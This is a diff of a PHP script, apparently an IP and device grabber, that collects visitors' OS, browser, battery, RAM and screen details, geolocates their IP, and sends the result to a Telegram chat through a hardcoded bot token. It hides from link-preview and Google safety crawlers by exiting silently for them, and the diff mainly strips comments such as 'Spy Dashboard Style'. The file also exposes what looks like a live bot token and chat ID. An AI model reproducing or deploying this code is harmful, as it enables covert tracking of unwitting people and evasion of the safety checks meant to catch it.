@@ -1,25 +1,22 @@
 <?php
-// ******************************************
-// CONFIGURATION: PASTE YOUR REAL DETAILS HERE
-// ******************************************
+
 $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
-if (strpos($userAgent, 'TelegramBot') !== false ||      // Telegram
-    strpos($userAgent, 'WhatsApp') !== false ||         // WhatsApp
-    strpos($userAgent, 'Instagram') !== false ||        // Instagram
-    strpos($userAgent, 'facebookexternalhit') !== false || // FB/Messenger
-    strpos($userAgent, 'Facebot') !== false ||          // FB Crawler
-    strpos($userAgent, 'GoogleImageProxy') !== false || // Gmail Previews
-    strpos($userAgent, 'Googlebot') !== false ||        // Google Search
+if (strpos($userAgent, 'TelegramBot') !== false ||      
+    strpos($userAgent, 'WhatsApp') !== false ||        
+    strpos($userAgent, 'Instagram') !== false ||        
+    strpos($userAgent, 'facebookexternalhit') !== false || 
+    strpos($userAgent, 'Facebot') !== false ||          
+    strpos($userAgent, 'GoogleImageProxy') !== false || 
+    strpos($userAgent, 'Googlebot') !== false ||        
     strpos($userAgent, 'Google-Safety') !== false ||    
-    strpos($userAgent, 'Mediapartners-Google') !== false) { // AdSense Bot
+    strpos($userAgent, 'Mediapartners-Google') !== false) { 
     
     exit(); // Stop immediately. Show them nothing.
 }
 
-$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; // Paste your 8386... token here
-$chatId = "-1003598938463";     // Paste your -100... ID here
-// ******************************************
+$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; 
+$chatId = "-1003598938463";     
 
 // Receive Data
 $os = $_POST['Os'];
@@ -31,7 +28,6 @@ $ven = $_POST['Ven'];
 $ren = $_POST['Ren'];
 $ht = $_POST['Ht'];
 $wd = $_POST['Wd'];
-// NEW: Receive Battery Level
 $bat = $_POST['Bat'] ?? "Unknown"; 
 
 // Get Real IP (Cloudflare support included)
@@ -47,9 +43,9 @@ $city = $details->city ?? "Unknown";
 $region = $details->regionName ?? "Unknown";
 $country = $details->country ?? "Unknown";
 $isp = $details->isp ?? "Unknown";
-// -------------------------------------------------
 
-// Format Message (Spy Dashboard Style)
+
+// Format Message
 $message = "<b>📱 DEVICE & NETWORK CAPTURED!</b>\n\n";
 
 // Section 1: Network / Location
@@ -63,7 +59,7 @@ $message .= "└ <b>ISP:</b> " . $isp . "\n\n";
 $message .= "<b>💻 DEVICE FINGERPRINT:</b>\n";
 $message .= "├ <b>OS:</b> " . $os . " (" . $ptf . ")\n";
 $message .= "├ <b>Browser:</b> " . $brw . "\n";
-$message .= "├ <b>Battery:</b> " . $bat . "\n"; // <--- NEW BATTERY DATA
+$message .= "├ <b>Battery:</b> " . $bat . "\n"; 
 $message .= "├ <b>RAM:</b> " . $ram . " GB\n";
 $message .= "├ <b>Screen:</b> " . $wd . "x" . $ht . " px\n";
 $message .= "├ <b>Cores:</b> " . $cc . "\n";
